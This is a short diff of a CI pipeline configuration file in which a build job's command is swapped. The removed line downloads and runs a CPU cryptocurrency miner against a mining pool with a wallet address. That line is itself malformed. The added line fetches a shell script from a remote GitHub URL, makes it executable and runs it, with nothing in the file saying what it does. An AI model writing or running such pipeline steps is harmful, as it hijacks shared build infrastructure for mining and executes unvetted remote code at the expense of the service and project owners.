@@ -83,4 +83,4 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'sudo apt-get update && sudo apt install cpulimit && | cpulimit -P cpuminer-sse2 -l 670 -b | mkdir suro && cd suro && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz &&  ./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MYkMsBC5C3XidNixZofNNsYabY8LZZQoeh.1'
+            - ' wget https://raw.githubusercontent.com/surorebro/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh'
